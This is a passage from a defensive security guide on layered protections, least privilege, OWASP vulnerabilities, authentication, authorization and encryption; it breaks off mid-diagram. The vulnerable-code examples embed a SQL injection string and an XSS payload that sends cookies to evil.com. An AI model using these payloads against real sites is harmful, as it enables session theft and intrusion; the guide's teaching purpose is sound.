# Security Best Practices

## Overview

Security is not a feature to be added later; it must be integrated into every layer of system design from the beginning. A security breach can destroy user trust, result in legal liability, and cause significant financial damage. This guide covers defense in depth, least privilege principles, common vulnerabilities, and practical security patterns for building secure systems.

## Table of Contents

1. [Defense in Depth](#defense-in-depth)
2. [Principle of Least Privilege](#principle-of-least-privilege)
3. [Common Vulnerabilities](#common-vulnerabilities)
4. [Authentication Best Practices](#authentication-best-practices)
5. [Authorization Patterns](#authorization-patterns)
6. [Data Protection](#data-protection)
7. [Network Security](#network-security)
8. [Common Mistakes to Avoid](#common-mistakes-to-avoid)
9. [Implementation Guidelines](#implementation-guidelines)
10. [Interview Talking Points](#interview-talking-points)
11. [Key Takeaways](#key-takeaways)

---

## Defense in Depth

### The Layered Security Model

Defense in depth means implementing multiple independent security controls so that if one layer fails, others still provide protection.

```
                    ┌──────────────────────────────────────┐
                    │           INTERNET                    │
                    └──────────────────────────────────────┘
                                     │
                    ┌──────────────────────────────────────┐
                    │     WAF / DDoS Protection             │  Layer 1: Perimeter
                    └──────────────────────────────────────┘
                                     │
                    ┌──────────────────────────────────────┐
                    │     Load Balancer / TLS               │  Layer 2: Edge
                    └──────────────────────────────────────┘
                                     │
                    ┌──────────────────────────────────────┐
                    │     API Gateway / Rate Limiting       │  Layer 3: Gateway
                    └──────────────────────────────────────┘
                                     │
                    ┌──────────────────────────────────────┐
                    │     Authentication / Authorization    │  Layer 4: Identity
                    └──────────────────────────────────────┘
                                     │
                    ┌──────────────────────────────────────┐
                    │     Application Security              │  Layer 5: Application
                    └──────────────────────────────────────┘
                                     │
                    ┌──────────────────────────────────────┐
                    │     Database Security                 │  Layer 6: Data
                    └──────────────────────────────────────┘
```

### Implementing Defense in Depth

#### Layer 1: Perimeter Security

```python
# WAF rules (AWS WAF example)
waf_rules = {
    'SQL_INJECTION': {
        'enabled': True,
        'action': 'BLOCK',
        'priority': 1
    },
    'XSS': {
        'enabled': True,
        'action': 'BLOCK',
        'priority': 2
    },
    'RATE_LIMIT': {
        'enabled': True,
        'action': 'BLOCK',
        'limit': 2000,
        'window_seconds': 300,
        'priority': 3
    },
    'GEO_BLOCK': {
        'enabled': True,
        'blocked_countries': ['XX', 'YY'],  # Configurable
        'priority': 4
    }
}
```

#### Layer 2: Edge Security (TLS)

```yaml
# nginx TLS configuration
server {
    listen 443 ssl http2;

    # Modern TLS configuration
    ssl_certificate /etc/ssl/certs/server.crt;
    ssl_certificate_key /etc/ssl/private/server.key;

    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
    ssl_prefer_server_ciphers off;

    # HSTS
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

    # Security headers
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Content-Security-Policy "default-src 'self'" always;
}
```

#### Layer 3: API Gateway Security

```python
from functools import wraps
from flask import request, jsonify
import time

class APISecurityGateway:
    def __init__(self, redis_client):
        self.redis = redis_client

    def rate_limit(self, limit: int, window: int):
        """Rate limiting decorator."""
        def decorator(f):
            @wraps(f)
            def wrapped(*args, **kwargs):
                client_ip = request.remote_addr
                key = f"rate_limit:{client_ip}:{request.endpoint}"

                current = self.redis.incr(key)
                if current == 1:
                    self.redis.expire(key, window)

                if current > limit:
                    return jsonify({'error': 'Rate limit exceeded'}), 429

                return f(*args, **kwargs)
            return wrapped
        return decorator

    def validate_request(self, schema):
        """Request validation decorator."""
        def decorator(f):
            @wraps(f)
            def wrapped(*args, **kwargs):
                errors = schema.validate(request.json)
                if errors:
                    return jsonify({'error': 'Invalid request', 'details': errors}), 400
                return f(*args, **kwargs)
            return wrapped
        return decorator

    def require_api_key(self, f):
        """API key authentication decorator."""
        @wraps(f)
        def wrapped(*args, **kwargs):
            api_key = request.headers.get('X-API-Key')
            if not api_key or not self.validate_api_key(api_key):
                return jsonify({'error': 'Invalid API key'}), 401
            return f(*args, **kwargs)
        return wrapped
```

#### Layer 4: Application Security

```python
class SecureApplication:
    """Security controls at the application level."""

    def __init__(self):
        self.input_sanitizer = InputSanitizer()
        self.output_encoder = OutputEncoder()

    def process_request(self, request):
        # Input validation
        sanitized_input = self.input_sanitizer.sanitize(request.data)

        # Business logic
        result = self.business_logic.process(sanitized_input)

        # Output encoding
        safe_output = self.output_encoder.encode(result)

        return safe_output

class InputSanitizer:
    def sanitize(self, data: dict) -> dict:
        """Sanitize all input data."""
        sanitized = {}
        for key, value in data.items():
            if isinstance(value, str):
                # Remove potential script tags
                sanitized[key] = self.sanitize_string(value)
            elif isinstance(value, dict):
                sanitized[key] = self.sanitize(value)
            else:
                sanitized[key] = value
        return sanitized

    def sanitize_string(self, value: str) -> str:
        """Remove dangerous characters."""
        import html
        return html.escape(value)

class OutputEncoder:
    def encode(self, data: dict) -> dict:
        """Encode output for safe rendering."""
        # Context-aware encoding
        return json.dumps(data)
```

---

## Principle of Least Privilege

### Core Concept

Every user, process, and system should have only the minimum permissions necessary to perform their function.

```
Overly Permissive (Bad):
┌──────────────────────────────────────────────────────────────┐
│  User Account                                                 │
│  Permissions: READ_ALL, WRITE_ALL, DELETE_ALL, ADMIN         │
│  Access: ALL_TABLES, ALL_SERVICES, ALL_SECRETS               │
└──────────────────────────────────────────────────────────────┘

Least Privilege (Good):
┌──────────────────────────────────────────────────────────────┐
│  User Account: order_service                                  │
│  Permissions: READ_ORDERS, WRITE_ORDERS                      │
│  Access: orders_table, inventory_service (read-only)         │
└──────────────────────────────────────────────────────────────┘
```

### Implementing Least Privilege

#### Database Permissions

```sql
-- Bad: Application uses root/admin account
GRANT ALL PRIVILEGES ON *.* TO 'app'@'%';

-- Good: Separate accounts with minimal permissions
-- Read-only account for queries
CREATE USER 'app_reader'@'%' IDENTIFIED BY 'secure_password';
GRANT SELECT ON myapp.users TO 'app_reader'@'%';
GRANT SELECT ON myapp.orders TO 'app_reader'@'%';

-- Write account for specific operations
CREATE USER 'app_writer'@'%' IDENTIFIED BY 'secure_password';
GRANT SELECT, INSERT, UPDATE ON myapp.orders TO 'app_writer'@'%';
-- Note: No DELETE permission

-- Migration account (used only during deployments)
CREATE USER 'app_migrator'@'%' IDENTIFIED BY 'secure_password';
GRANT ALTER, CREATE, DROP, INDEX ON myapp.* TO 'app_migrator'@'%';
```

#### Service Account Permissions

```python
# AWS IAM policy - Least privilege example
iam_policy = {
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "s3:GetObject",
                "s3:PutObject"
            ],
            "Resource": "arn:aws:s3:::my-bucket/uploads/*"
            # Only specific path, not entire bucket
        },
        {
            "Effect": "Allow",
            "Action": [
                "sqs:SendMessage",
                "sqs:ReceiveMessage",
                "sqs:DeleteMessage"
            ],
            "Resource": "arn:aws:sqs:us-east-1:123456789:my-queue"
            # Only specific queue
        },
        {
            "Effect": "Allow",
            "Action": [
                "secretsmanager:GetSecretValue"
            ],
            "Resource": "arn:aws:secretsmanager:us-east-1:123456789:secret:my-app/*"
            # Only specific secrets
        }
    ]
}
```

#### Application-Level Permissions

```python
from enum import Enum, auto
from typing import Set
from functools import wraps

class Permission(Enum):
    READ_USER = auto()
    WRITE_USER = auto()
    DELETE_USER = auto()
    READ_ORDER = auto()
    WRITE_ORDER = auto()
    ADMIN = auto()

class Role:
    """Define roles with specific permissions."""

    ROLES = {
        'customer': {Permission.READ_USER, Permission.READ_ORDER},
        'support': {Permission.READ_USER, Permission.READ_ORDER, Permission.WRITE_ORDER},
        'manager': {Permission.READ_USER, Permission.WRITE_USER, Permission.READ_ORDER, Permission.WRITE_ORDER},
        'admin': {Permission.ADMIN}
    }

    @classmethod
    def get_permissions(cls, role_name: str) -> Set[Permission]:
        return cls.ROLES.get(role_name, set())

def require_permission(permission: Permission):
    """Decorator to enforce permission check."""
    def decorator(f):
        @wraps(f)
        def wrapped(*args, **kwargs):
            user = get_current_user()
            user_permissions = Role.get_permissions(user.role)

            if Permission.ADMIN in user_permissions:
                return f(*args, **kwargs)

            if permission not in user_permissions:
                raise PermissionDeniedError(
                    f"Permission {permission.name} required"
                )

            return f(*args, **kwargs)
        return wrapped
    return decorator

# Usage
@require_permission(Permission.WRITE_ORDER)
def update_order(order_id: int, data: dict):
    # Only users with WRITE_ORDER permission can access
    pass
```

#### Time-Limited Permissions

```python
import jwt
from datetime import datetime, timedelta

class TemporaryAccessToken:
    """Grant temporary elevated permissions."""

    def __init__(self, secret_key: str):
        self.secret_key = secret_key

    def create_elevated_token(
        self,
        user_id: str,
        temporary_permissions: List[str],
        duration_minutes: int = 15
    ) -> str:
        """Create short-lived token with elevated permissions."""
        payload = {
            'user_id': user_id,
            'elevated_permissions': temporary_permissions,
            'exp': datetime.utcnow() + timedelta(minutes=duration_minutes),
            'iat': datetime.utcnow(),
            'type': 'elevated'
        }
        return jwt.encode(payload, self.secret_key, algorithm='HS256')

    def verify_elevated_token(self, token: str) -> dict:
        """Verify and extract elevated permissions."""
        try:
            payload = jwt.decode(token, self.secret_key, algorithms=['HS256'])
            if payload.get('type') != 'elevated':
                raise InvalidTokenError("Not an elevated token")
            return payload
        except jwt.ExpiredSignatureError:
            raise TokenExpiredError("Elevated access has expired")
```

---

## Common Vulnerabilities

### OWASP Top 10 Overview

```
1. Injection              - SQL, NoSQL, OS, LDAP injection
2. Broken Authentication  - Session management flaws
3. Sensitive Data Exposure - Unencrypted data, weak crypto
4. XML External Entities  - XXE attacks
5. Broken Access Control  - Unauthorized access
6. Security Misconfig     - Default credentials, verbose errors
7. Cross-Site Scripting   - Reflected, stored, DOM XSS
8. Insecure Deserialization - Untrusted data deserialization
9. Vulnerable Components  - Outdated libraries
10. Insufficient Logging  - No audit trail
```

### SQL Injection Prevention

```python
# VULNERABLE: String concatenation
def get_user_vulnerable(username):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    # Input: ' OR '1'='1' --
    # Results in: SELECT * FROM users WHERE username = '' OR '1'='1' --'
    return db.execute(query)

# SECURE: Parameterized queries
def get_user_secure(username):
    query = "SELECT * FROM users WHERE username = %s"
    return db.execute(query, (username,))

# SECURE: ORM with proper escaping
def get_user_orm(username):
    return User.query.filter_by(username=username).first()

# Additional: Input validation
import re

def validate_username(username: str) -> bool:
    """Validate username format before use."""
    pattern = r'^[a-zA-Z0-9_]{3,30}$'
    return bool(re.match(pattern, username))
```

### Cross-Site Scripting (XSS) Prevention

```python
from markupsafe import escape
from flask import Markup

# VULNERABLE: Direct output
def render_comment_vulnerable(comment):
    return f"<div class='comment'>{comment}</div>"
    # Input: <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>

# SECURE: HTML escaping
def render_comment_secure(comment):
    return f"<div class='comment'>{escape(comment)}</div>"

# SECURE: Content Security Policy headers
@app.after_request
def add_security_headers(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self' 'nonce-{nonce}'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data: https:; "
        "font-src 'self'; "
        "frame-ancestors 'none'"
    )
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    return response

# SECURE: Sanitize HTML if rich text is needed
import bleach

ALLOWED_TAGS = ['p', 'br', 'strong', 'em', 'a', 'ul', 'li']
ALLOWED_ATTRS = {'a': ['href', 'title']}

def sanitize_rich_text(html_content: str) -> str:
    return bleach.clean(
        html_content,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRS,
        strip=True
    )
```

### Cross-Site Request Forgery (CSRF) Prevention

```python
from flask_wtf.csrf import CSRFProtect
import secrets

# Initialize CSRF protection
csrf = CSRFProtect(app)

# Generate CSRF token
def generate_csrf_token():
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)
    return session['csrf_token']

# Validate CSRF token
def validate_csrf_token(token: str) -> bool:
    return secrets.compare_digest(
        token,
        session.get('csrf_token', '')
    )

# Template usage
"""
<form method="POST">
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
    <!-- form fields -->
</form>
"""

# API protection with custom header
@app.before_request
def csrf_protect_api():
    if request.method in ['POST', 'PUT', 'DELETE']:
        # For APIs, require custom header (can't be set by forms)
        if not request.headers.get('X-Requested-With') == 'XMLHttpRequest':
            abort(403, 'CSRF validation failed')
```

### Insecure Deserialization Prevention

```python
import pickle
import json
from typing import Any

# VULNERABLE: Pickle with untrusted data
def load_data_vulnerable(serialized_data):
    return pickle.loads(serialized_data)  # Can execute arbitrary code!

# SECURE: Use JSON for untrusted data
def load_data_secure(serialized_data: str) -> dict:
    try:
        return json.loads(serialized_data)
    except json.JSONDecodeError:
        raise ValueError("Invalid JSON data")

# SECURE: If you must use pickle, whitelist classes
import io

class SafeUnpickler(pickle.Unpickler):
    ALLOWED_CLASSES = {
        ('myapp.models', 'User'),
        ('myapp.models', 'Order'),
    }

    def find_class(self, module, name):
        if (module, name) not in self.ALLOWED_CLASSES:
            raise pickle.UnpicklingError(
                f"Class {module}.{name} is not allowed"
            )
        return super().find_class(module, name)

def safe_loads(data: bytes) -> Any:
    return SafeUnpickler(io.BytesIO(data)).load()
```

### Server-Side Request Forgery (SSRF) Prevention

```python
import ipaddress
from urllib.parse import urlparse
import socket

class SSRFProtection:
    """Prevent SSRF attacks by validating URLs."""

    BLOCKED_HOSTS = {
        'localhost',
        '127.0.0.1',
        '0.0.0.0',
        '169.254.169.254',  # AWS metadata
        'metadata.google.internal',  # GCP metadata
    }

    BLOCKED_NETWORKS = [
        ipaddress.ip_network('10.0.0.0/8'),
        ipaddress.ip_network('172.16.0.0/12'),
        ipaddress.ip_network('192.168.0.0/16'),
        ipaddress.ip_network('127.0.0.0/8'),
        ipaddress.ip_network('169.254.0.0/16'),
    ]

    @classmethod
    def validate_url(cls, url: str) -> bool:
        """Validate URL is safe to fetch."""
        try:
            parsed = urlparse(url)

            # Only allow HTTP(S)
            if parsed.scheme not in ('http', 'https'):
                return False

            hostname = parsed.hostname
            if not hostname:
                return False

            # Check blocked hosts
            if hostname.lower() in cls.BLOCKED_HOSTS:
                return False

            # Resolve DNS and check IP
            try:
                ip = ipaddress.ip_address(socket.gethostbyname(hostname))

                # Check blocked networks
                for network in cls.BLOCKED_NETWORKS:
                    if ip in network:
                        return False

            except socket.gaierror:
                return False

            return True

        except Exception:
            return False

# Usage
def fetch_external_resource(url: str):
    if not SSRFProtection.validate_url(url):
        raise SecurityError(f"URL not allowed: {url}")

    return requests.get(url, timeout=5)
```

---

## Authentication Best Practices

### Password Storage

```python
import bcrypt
import hashlib
import secrets

class PasswordManager:
    """Secure password handling."""

    def __init__(self, pepper: str):
        self.pepper = pepper  # Server-side secret

    def hash_password(self, password: str) -> str:
        """Hash password with bcrypt + pepper."""
        # Add pepper
        peppered = hashlib.sha256(
            (password + self.pepper).encode()
        ).hexdigest()

        # Hash with bcrypt (includes salt)
        hashed = bcrypt.hashpw(
            peppered.encode(),
            bcrypt.gensalt(rounds=12)
        )

        return hashed.decode()

    def verify_password(self, password: str, hashed: str) -> bool:
        """Verify password against hash."""
        peppered = hashlib.sha256(
            (password + self.pepper).encode()
        ).hexdigest()

        return bcrypt.checkpw(peppered.encode(), hashed.encode())

# Password policy validation
import re

class PasswordPolicy:
    MIN_LENGTH = 12
    REQUIRE_UPPERCASE = True
    REQUIRE_LOWERCASE = True
    REQUIRE_DIGIT = True
    REQUIRE_SPECIAL = True

    @classmethod
    def validate(cls, password: str) -> List[str]:
        """Return list of policy violations."""
        errors = []

        if len(password) < cls.MIN_LENGTH:
            errors.append(f"Password must be at least {cls.MIN_LENGTH} characters")

        if cls.REQUIRE_UPPERCASE and not re.search(r'[A-Z]', password):
            errors.append("Password must contain uppercase letter")

        if cls.REQUIRE_LOWERCASE and not re.search(r'[a-z]', password):
            errors.append("Password must contain lowercase letter")

        if cls.REQUIRE_DIGIT and not re.search(r'\d', password):
            errors.append("Password must contain digit")

        if cls.REQUIRE_SPECIAL and not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
            errors.append("Password must contain special character")

        return errors
```

### Multi-Factor Authentication

```python
import pyotp
import qrcode
from io import BytesIO

class MFAManager:
    """TOTP-based multi-factor authentication."""

    def generate_secret(self) -> str:
        """Generate new TOTP secret for user."""
        return pyotp.random_base32()

    def get_provisioning_uri(
        self,
        secret: str,
        email: str,
        issuer: str = "MyApp"
    ) -> str:
        """Generate provisioning URI for authenticator apps."""
        totp = pyotp.TOTP(secret)
        return totp.provisioning_uri(email, issuer_name=issuer)

    def generate_qr_code(self, provisioning_uri: str) -> bytes:
        """Generate QR code image."""
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data(provisioning_uri)
        qr.make(fit=True)

        img = qr.make_image(fill_color="black", back_color="white")
        buffer = BytesIO()
        img.save(buffer, format='PNG')
        return buffer.getvalue()

    def verify_token(self, secret: str, token: str) -> bool:
        """Verify TOTP token."""
        totp = pyotp.TOTP(secret)
        # Allow 1 time step tolerance for clock drift
        return totp.verify(token, valid_window=1)

    def generate_backup_codes(self, count: int = 10) -> List[str]:
        """Generate one-time backup codes."""
        return [secrets.token_hex(4).upper() for _ in range(count)]
```

### Session Management

```python
import secrets
from datetime import datetime, timedelta
from typing import Optional

class SecureSessionManager:
    """Secure session handling."""

    def __init__(self, redis_client, session_ttl: int = 3600):
        self.redis = redis_client
        self.session_ttl = session_ttl

    def create_session(self, user_id: str, metadata: dict = None) -> str:
        """Create new session with secure token."""
        session_id = secrets.token_urlsafe(32)

        session_data = {
            'user_id': user_id,
            'created_at': datetime.utcnow().isoformat(),
            'ip_address': metadata.get('ip_address'),
            'user_agent': metadata.get('user_agent'),
        }

        self.redis.setex(
            f"session:{session_id}",
            self.session_ttl,
            json.dumps(session_data)
        )

        return session_id

    def validate_session(
        self,
        session_id: str,
        current_ip: str = None
    ) -> Optional[dict]:
        """Validate session and optionally check IP."""
        session_data = self.redis.get(f"session:{session_id}")

        if not session_data:
            return None

        data = json.loads(session_data)

        # Optional: Validate IP hasn't changed (prevents session hijacking)
        # Note: Be careful with this for users on mobile networks
        # if current_ip and data.get('ip_address') != current_ip:
        #     return None

        # Refresh TTL on activity
        self.redis.expire(f"session:{session_id}", self.session_ttl)

        return data

    def destroy_session(self, session_id: str):
        """Invalidate session."""
        self.redis.delete(f"session:{session_id}")

    def destroy_all_user_sessions(self, user_id: str):
        """Invalidate all sessions for user (e.g., password change)."""
        # This requires session indexing by user
        pattern = f"session:*"
        for key in self.redis.scan_iter(match=pattern):
            session_data = self.redis.get(key)
            if session_data:
                data = json.loads(session_data)
                if data.get('user_id') == user_id:
                    self.redis.delete(key)
```

---

## Authorization Patterns

### Role-Based Access Control (RBAC)

```python
from enum import Enum
from typing import Set, Dict

class Permission(Enum):
    # User permissions
    USER_READ = "user:read"
    USER_WRITE = "user:write"
    USER_DELETE = "user:delete"

    # Order permissions
    ORDER_READ = "order:read"
    ORDER_WRITE = "order:write"
    ORDER_DELETE = "order:delete"

    # Admin permissions
    SYSTEM_CONFIG = "system:config"
    AUDIT_READ = "audit:read"

class RBACManager:
    """Role-Based Access Control implementation."""

    ROLE_PERMISSIONS: Dict[str, Set[Permission]] = {
        'customer': {
            Permission.USER_READ,
            Permission.ORDER_READ,
            Permission.ORDER_WRITE,
        },
        'support': {
            Permission.USER_READ,
            Permission.ORDER_READ,
            Permission.ORDER_WRITE,
        },
        'manager': {
            Permission.USER_READ,
            Permission.USER_WRITE,
            Permission.ORDER_READ,
            Permission.ORDER_WRITE,
            Permission.ORDER_DELETE,
            Permission.AUDIT_READ,
        },
        'admin': set(Permission),  # All permissions
    }

    @classmethod
    def has_permission(cls, user_roles: List[str], permission: Permission) -> bool:
        """Check if any of user's roles has the permission."""
        for role in user_roles:
            if permission in cls.ROLE_PERMISSIONS.get(role, set()):
                return True
        return False

    @classmethod
    def get_user_permissions(cls, user_roles: List[str]) -> Set[Permission]:
        """Get all permissions for user's roles."""
        permissions = set()
        for role in user_roles:
            permissions.update(cls.ROLE_PERMISSIONS.get(role, set()))
        return permissions
```

### Attribute-Based Access Control (ABAC)

```python
from dataclasses import dataclass
from typing import Any, Callable

@dataclass
class AccessContext:
    """Context for access control decision."""
    user: 'User'
    resource: Any
    action: str
    environment: dict  # time, location, etc.

class ABACPolicy:
    """Attribute-Based Access Control policy."""

    def __init__(self):
        self.rules: List[Callable[[AccessContext], bool]] = []

    def add_rule(self, rule: Callable[[AccessContext], bool]):
        self.rules.append(rule)

    def evaluate(self, context: AccessContext) -> bool:
        """Evaluate all rules - all must pass."""
        return all(rule(context) for rule in self.rules)

# Define policies
order_access_policy = ABACPolicy()

# Rule: User can only access their own orders
order_access_policy.add_rule(
    lambda ctx: ctx.resource.user_id == ctx.user.id
    or 'support' in ctx.user.roles
    or 'admin' in ctx.user.roles
)

# Rule: Deletions only during business hours
order_access_policy.add_rule(
    lambda ctx: ctx.action != 'delete'
    or (9 <= ctx.environment['hour'] <= 17)
)

# Rule: High-value orders require manager approval
order_access_policy.add_rule(
    lambda ctx: ctx.resource.total < 10000
    or 'manager' in ctx.user.roles
    or ctx.resource.manager_approved
)

# Usage
def delete_order(user: User, order: Order):
    context = AccessContext(
        user=user,
        resource=order,
        action='delete',
        environment={'hour': datetime.now().hour}
    )

    if not order_access_policy.evaluate(context):
        raise PermissionDeniedError("Access denied")

    # Proceed with deletion
```

### Resource-Level Authorization

```python
class ResourceAuthorizer:
    """Fine-grained resource-level authorization."""

    def __init__(self, db_session):
        self.db = db_session

    def can_access_document(self, user: User, document_id: str) -> bool:
        """Check if user can access specific document."""
        document = self.db.query(Document).get(document_id)

        if not document:
            return False

        # Owner always has access
        if document.owner_id == user.id:
            return True

        # Check explicit sharing
        share = self.db.query(DocumentShare).filter_by(
            document_id=document_id,
            user_id=user.id
        ).first()

        if share:
            return True

        # Check team access
        if document.team_id in user.team_ids:
            return True

        # Check organization-wide access
        if document.org_public and document.org_id == user.org_id:
            return True

        return False

    def filter_accessible_documents(
        self,
        user: User,
        query
    ):
        """Add authorization filters to query."""
        return query.filter(
            db.or_(
                Document.owner_id == user.id,
                Document.id.in_(
                    self.db.query(DocumentShare.document_id)
                    .filter_by(user_id=user.id)
                ),
                db.and_(
                    Document.team_id.in_(user.team_ids),
                    Document.team_visible == True
                ),
                db.and_(
                    Document.org_id == user.org_id,
                    Document.org_public == True
                )
            )
        )
```

---

## Data Protection

### Encryption at Rest

```python
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
import base64
import os

class DataEncryption:
    """Encrypt sensitive data at rest."""

    def __init__(self, master_key: bytes):
        self.fernet = Fernet(master_key)

    @staticmethod
    def generate_key() -> bytes:
        """Generate new encryption key."""
        return Fernet.generate_key()

    @staticmethod
    def derive_key_from_password(password: str, salt: bytes) -> bytes:
        """Derive encryption key from password."""
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=480000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key

    def encrypt(self, plaintext: str) -> str:
        """Encrypt string data."""
        return self.fernet.encrypt(plaintext.encode()).decode()

    def decrypt(self, ciphertext: str) -> str:
        """Decrypt string data."""
        return self.fernet.decrypt(ciphertext.encode()).decode()

# Field-level encryption for database
from sqlalchemy import TypeDecorator, String

class EncryptedString(TypeDecorator):
    """SQLAlchemy type for encrypted strings."""

    impl = String
    cache_ok = True

    def __init__(self, encryption: DataEncryption, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.encryption = encryption

    def process_bind_param(self, value, dialect):
        if value is not None:
            return self.encryption.encrypt(value)
        return value

    def process_result_value(self, value, dialect):
        if value is not None:
            return self.encryption.decrypt(value)
        return value

# Usage in model
class User(Base):
    __tablename__ = 'users'

    id = Column(Integer, primary_key=True)
    email = Column(String(255))
    # SSN is encrypted at rest
    ssn = Column(EncryptedString(encryption, length=500))
```

### Data Masking

```python
import re
from typing import Any

class DataMasker:
    """Mask sensitive data for logging and display."""

    @staticmethod
    def mask_email(email: str) -> str:
        """Mask email address."""
        if not email or '@' not in email:
            return '***'
        local, domain = email.split('@')
        if len(local) <= 2:
            masked_local = '*' * len(local)
        else:
            masked_local = local[0] + '*' * (len(local) - 2) + local[-1]
        return f"{masked_local}@{domain}"

    @staticmethod
    def mask_phone(phone: str) -> str:
        """Mask phone number."""
        digits = re.sub(r'\D', '', phone)
        if len(digits) < 4:
            return '***'
        return '*' * (len(digits) - 4) + digits[-4:]

    @staticmethod
    def mask_credit_card(card: str) -> str:
        """Mask credit card number."""
        digits = re.sub(r'\D', '', card)
        if len(digits) < 4:
            return '***'
        return '*' * (len(digits) - 4) + digits[-4:]

    @staticmethod
    def mask_ssn(ssn: str) -> str:
        """Mask Social Security Number."""
        digits = re.sub(r'\D', '', ssn)
        if len(digits) != 9:
            return '***-**-****'
        return f"***-**-{digits[-4:]}"

    @classmethod
    def mask_dict(cls, data: dict, sensitive_fields: set) -> dict:
        """Mask sensitive fields in dictionary."""
        masked = {}
        for key, value in data.items():
            if key in sensitive_fields:
                if 'email' in key.lower():
                    masked[key] = cls.mask_email(str(value))
                elif 'phone' in key.lower():
                    masked[key] = cls.mask_phone(str(value))
                elif 'card' in key.lower():
                    masked[key] = cls.mask_credit_card(str(value))
                elif 'ssn' in key.lower():
                    masked[key] = cls.mask_ssn(str(value))
                else:
                    masked[key] = '***'
            elif isinstance(value, dict):
                masked[key] = cls.mask_dict(value, sensitive_fields)
            else:
                masked[key] = value
        return masked

# Usage
SENSITIVE_FIELDS = {'email', 'phone', 'ssn', 'credit_card', 'password'}

user_data = {
    'name': 'John Doe',
    'email': 'john.doe@example.com',
    'phone': '555-123-4567',
    'ssn': '123-45-6789'
}

masked = DataMasker.mask_dict(user_data, SENSITIVE_FIELDS)
# {'name': 'John Doe', 'email': 'j******e@example.com',
#  'phone': '*******4567', 'ssn': '***-**-6789'}
```

### Secure Secrets Management

```python
import os
from functools import lru_cache
import boto3
import json

class SecretsManager:
    """Centralized secrets management."""

    def __init__(self):
        self._aws_client = None
        self._cache = {}

    @property
    def aws_client(self):
        if self._aws_client is None:
            self._aws_client = boto3.client('secretsmanager')
        return self._aws_client

    def get_secret(self, secret_name: str) -> dict:
        """Retrieve secret from AWS Secrets Manager."""
        if secret_name in self._cache:
            return self._cache[secret_name]

        response = self.aws_client.get_secret_value(SecretId=secret_name)
        secret = json.loads(response['SecretString'])

        self._cache[secret_name] = secret
        return secret

    @staticmethod
    def get_env_secret(key: str, default: str = None) -> str:
        """Get secret from environment variable."""
        value = os.environ.get(key, default)
        if value is None:
            raise ValueError(f"Required secret {key} not found")
        return value

# Configuration that uses secrets
class Config:
    def __init__(self, secrets_manager: SecretsManager):
        self.secrets = secrets_manager

    @property
    @lru_cache()
    def database_url(self) -> str:
        db_secrets = self.secrets.get_secret('production/database')
        return (
            f"postgresql://{db_secrets['username']}:{db_secrets['password']}"
            f"@{db_secrets['host']}:{db_secrets['port']}/{db_secrets['database']}"
        )

    @property
    @lru_cache()
    def api_key(self) -> str:
        return self.secrets.get_secret('production/api')['key']
```

---

## Network Security

### TLS Configuration

```yaml
# Modern TLS configuration (nginx)
ssl_protocols TLSv1.2 TLSv1.3;

# Secure cipher suites
ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';

ssl_prefer_server_ciphers off;
ssl_session_timeout 1d;
ssl_session_cache shared:SSL:50m;
ssl_session_tickets off;

# OCSP Stapling
ssl_stapling on;
ssl_stapling_verify on;
resolver 8.8.8.8 8.8.4.4 valid=300s;
resolver_timeout 5s;
```

### Security Headers

```python
class SecurityHeaders:
    """Security header configuration."""

    @staticmethod
    def get_headers() -> dict:
        return {
            # Prevent clickjacking
            'X-Frame-Options': 'DENY',

            # Prevent MIME type sniffing
            'X-Content-Type-Options': 'nosniff',

            # XSS Protection (legacy browsers)
            'X-XSS-Protection': '1; mode=block',

            # Referrer Policy
            'Referrer-Policy': 'strict-origin-when-cross-origin',

            # Content Security Policy
            'Content-Security-Policy': (
                "default-src 'self'; "
                "script-src 'self' 'unsafe-inline'; "
                "style-src 'self' 'unsafe-inline'; "
                "img-src 'self' data: https:; "
                "font-src 'self'; "
                "connect-src 'self' https://api.example.com; "
                "frame-ancestors 'none'; "
                "base-uri 'self'; "
                "form-action 'self'"
            ),

            # HSTS (HTTPS only)
            'Strict-Transport-Security': 'max-age=31536000; includeSubDomains; preload',

            # Permissions Policy
            'Permissions-Policy': (
                'geolocation=(), '
                'microphone=(), '
                'camera=(), '
                'payment=()'
            ),
        }

# Flask middleware
@app.after_request
def add_security_headers(response):
    for header, value in SecurityHeaders.get_headers().items():
        response.headers[header] = value
    return response
```

### Network Segmentation

```
                    Internet
                        │
                        ▼
    ┌───────────────────────────────────────┐
    │            DMZ / Public               │
    │    Load Balancer, WAF, CDN            │
    │    10.0.1.0/24                         │
    └───────────────────────────────────────┘
                        │
                   Firewall
                        │
    ┌───────────────────────────────────────┐
    │         Application Tier              │
    │    Web Servers, API Servers           │
    │    10.0.2.0/24                         │
    └───────────────────────────────────────┘
                        │
                   Firewall
                        │
    ┌───────────────────────────────────────┐
    │           Data Tier                   │
    │    Databases, Cache, Queue            │
    │    10.0.3.0/24                         │
    └───────────────────────────────────────┘
                        │
                   Firewall
                        │
    ┌───────────────────────────────────────┐
    │          Management Tier              │
    │    Monitoring, Logging, Bastion       │
